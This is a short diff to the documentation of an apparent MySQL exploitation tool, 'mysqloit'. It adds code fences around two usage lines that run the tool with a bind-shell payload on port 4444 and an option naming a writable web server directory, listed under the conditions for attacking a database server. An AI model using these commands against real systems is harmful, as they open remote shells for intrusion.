@@ -48,8 +48,10 @@ Condition B:
 * web server root directory = /var/www
 * writable web server directory = /var/www/upload
 
+```
 ./mysqloit.py -p bind 4444 
 ./mysqloit.py -e /var/www /upload
+```
 
 Condition C:
 * mysqld runs as a non root user
